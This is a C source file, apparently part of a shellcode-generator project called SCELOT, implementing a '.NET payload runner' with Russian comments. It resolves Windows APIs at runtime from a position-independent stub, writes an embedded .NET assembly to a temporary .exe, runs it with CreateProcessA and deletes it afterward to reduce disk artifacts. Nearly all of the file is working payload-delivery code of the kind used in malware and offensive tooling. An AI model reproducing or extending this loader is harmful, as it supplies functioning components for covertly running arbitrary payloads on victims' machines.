// .NET payload runner.
//
// Подход CreateProcess: записываем .NET-сборку во временный .exe и запускаем
// через CreateProcessA. Windows активирует CLR через стандартный процессный
// startup — никаких возни с ICLRRuntimeHost / ICorRuntimeHost / IDispatch,
// которые на современной Win11 24H2 требуют manifest и не работают в чистом
// native процессе.
//
// Минусы: артефакт на диске на время запуска (удаляется после завершения).
// Плюсы: работает гарантированно, на любой Windows с .NET Framework 4.x.

#include "host_clr.h"
#include <windows.h>

#ifdef SCELOT_TRACE
static void clr_trace(fn_LoadLibraryA pLL, fn_GetProcAddress pGPA, const char* msg) {
    HMODULE k32 = pLL("kernel32.dll");
    if (!k32) return;
    typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
    typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE);
    typedef DWORD  (WINAPI *fn_SetFilePointer)(HANDLE, LONG, PLONG, DWORD);
    typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPVOID);
    typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
    fn_GetTempPathA   pT = (fn_GetTempPathA)  pGPA(k32, "GetTempPathA");
    fn_CreateFileA    pC = (fn_CreateFileA)   pGPA(k32, "CreateFileA");
    fn_SetFilePointer pS = (fn_SetFilePointer)pGPA(k32, "SetFilePointer");
    fn_WriteFile      pW = (fn_WriteFile)     pGPA(k32, "WriteFile");
    fn_CloseHandle    pX = (fn_CloseHandle)   pGPA(k32, "CloseHandle");
    if (!pT || !pC || !pS || !pW || !pX) return;
    char path[MAX_PATH]; pT(MAX_PATH, path);
    int n = 0; while (path[n]) ++n;
    static const char fname[] = "scelot_clr_trace.txt";
    for (int i = 0; fname[i] && n < MAX_PATH - 1; ++i) path[n++] = fname[i];
    path[n] = 0;
    HANDLE h = pC(path, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                  OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    pS(h, 0, NULL, FILE_END);
    DWORD wr;
    int len = 0; while (msg[len]) ++len;
    pW(h, msg, (DWORD)len, &wr, NULL);
    pW(h, "\r\n", 2, &wr, NULL);
    pX(h);
}
#define TR(msg) clr_trace(pLL, pGPA, msg)
#else
#define TR(msg) ((void)0)
#endif

int host_clr_run(fn_LoadLibraryA pLL, fn_GetProcAddress pGPA,
                 const uint8_t* assembly, uint32_t size,
                 const SCELOT_INSTANCE* inst) {
    TR("host_clr_run enter (CreateProcess strategy)");

    HMODULE k32 = pLL("kernel32.dll");
    if (!k32) { TR("LoadLibrary kernel32 failed"); return -1; }

    typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
    typedef UINT   (WINAPI *fn_GetTempFileNameA)(LPCSTR, LPCSTR, UINT, LPSTR);
    typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE);
    typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPVOID);
    typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
    typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
    typedef BOOL   (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPVOID, LPVOID, BOOL,
                                                DWORD, LPVOID, LPCSTR, LPVOID, LPVOID);
    typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);

    fn_GetTempPathA        pGTP  = (fn_GetTempPathA)       pGPA(k32, "GetTempPathA");
    fn_GetTempFileNameA    pGTF  = (fn_GetTempFileNameA)   pGPA(k32, "GetTempFileNameA");
    fn_CreateFileA         pCF   = (fn_CreateFileA)        pGPA(k32, "CreateFileA");
    fn_WriteFile           pWF   = (fn_WriteFile)          pGPA(k32, "WriteFile");
    fn_CloseHandle         pCH   = (fn_CloseHandle)        pGPA(k32, "CloseHandle");
    fn_DeleteFileA         pDF   = (fn_DeleteFileA)        pGPA(k32, "DeleteFileA");
    fn_CreateProcessA      pCP   = (fn_CreateProcessA)     pGPA(k32, "CreateProcessA");
    fn_WaitForSingleObject pWait = (fn_WaitForSingleObject)pGPA(k32, "WaitForSingleObject");

    if (!pGTP || !pGTF || !pCF || !pWF || !pCH || !pDF || !pCP || !pWait) {
        TR("API resolve failed");
        return -2;
    }

    // 1. Получаем путь к временному файлу. GetTempFileNameA создаёт <prefix>XXXX.tmp,
    //    нам нужно .exe — заменяем расширение и удаляем оригинальный .tmp.
    char tmpdir[MAX_PATH];
    char tmppath[MAX_PATH];
    if (!pGTP(MAX_PATH, tmpdir))      { TR("GetTempPath failed"); return -3; }
    if (!pGTF(tmpdir, "scl", 0, tmppath)) { TR("GetTempFileName failed"); return -3; }

    // tmppath заканчивается на ".tmp", меняем на ".exe".
    char exepath[MAX_PATH];
    int n = 0; while (tmppath[n] && n < MAX_PATH - 1) { exepath[n] = tmppath[n]; ++n; }
    if (n < 4) { TR("tmppath too short"); return -3; }
    exepath[n - 3] = 'e'; exepath[n - 2] = 'x'; exepath[n - 1] = 'e';
    exepath[n] = 0;
    pDF(tmppath);  // удаляем пустой .tmp

    // 2. Пишем .NET-сборку как .exe.
    HANDLE f = pCF(exepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                   FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) { TR("CreateFile (exe) failed"); return -4; }
    DWORD wr;
    pWF(f, assembly, size, &wr, NULL);
    pCH(f);
    TR("assembly written to temp .exe");

    // 3. Собираем командную строку: "<exepath>" <args>
    //    CreateProcess модифицирует cmdline — поэтому делаем локальный буфер.
    char cmdline[2048];
    int j = 0;
    cmdline[j++] = '"';
    for (int i = 0; exepath[i] && j < (int)sizeof(cmdline) - 4; ++i)
        cmdline[j++] = exepath[i];
    cmdline[j++] = '"';
    if (inst->args[0]) {
        cmdline[j++] = ' ';
        for (int i = 0; inst->args[i] && j < (int)sizeof(cmdline) - 1; ++i)
            cmdline[j++] = inst->args[i];
    }
    cmdline[j] = 0;

    // 4. Запускаем процесс. Windows активирует CLR автоматически через
    //    mscoree-shim, потому что .NET PE имеет COM_DESCRIPTOR в DataDirectory.
    //    ВАЖНО: stub'у нельзя полагаться ни на memset, ни на BSS-обнуление —
    //    .data склеена в .text плоского блоба, мусор остаётся. Поэтому каждое
    //    поле STARTUPINFOA / PROCESS_INFORMATION инициализируем явно.
    STARTUPINFOA si;
    si.cb              = sizeof(si);
    si.lpReserved      = NULL;
    si.lpDesktop       = NULL;
    si.lpTitle         = NULL;
    si.dwX             = 0;
    si.dwY             = 0;
    si.dwXSize         = 0;
    si.dwYSize         = 0;
    si.dwXCountChars   = 0;
    si.dwYCountChars   = 0;
    si.dwFillAttribute = 0;
    si.dwFlags         = 0;
    si.wShowWindow     = 0;
    si.cbReserved2     = 0;
    si.lpReserved2     = NULL;
    si.hStdInput       = NULL;
    si.hStdOutput      = NULL;
    si.hStdError       = NULL;

    PROCESS_INFORMATION pi;
    pi.hProcess    = NULL;
    pi.hThread     = NULL;
    pi.dwProcessId = 0;
    pi.dwThreadId  = 0;

    TR(exepath);
    TR(cmdline);
    if (!pCP(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        typedef DWORD (WINAPI *fn_GetLastError)(VOID);
        fn_GetLastError pGLE = (fn_GetLastError)pGPA(k32, "GetLastError");
        DWORD err = pGLE ? pGLE() : 0;
        char buf[64];
        const char* hexd = "0123456789abcdef";
        const char* p1 = "CreateProcess GLE=0x";
        int j2 = 0; while (p1[j2]) { buf[j2] = p1[j2]; ++j2; }
        for (int i = 0; i < 8; ++i)
            buf[j2++] = hexd[(err >> ((7 - i) * 4)) & 0xF];
        buf[j2] = 0;
        TR(buf);
        pDF(exepath);
        return -5;
    }
    TR("process started");

    // 5. Ждём завершения, чистим за собой.
    pWait(pi.hProcess, INFINITE);
    pCH(pi.hProcess);
    pCH(pi.hThread);
    pDF(exepath);
    TR("process finished, temp file deleted");
    return 0;
}
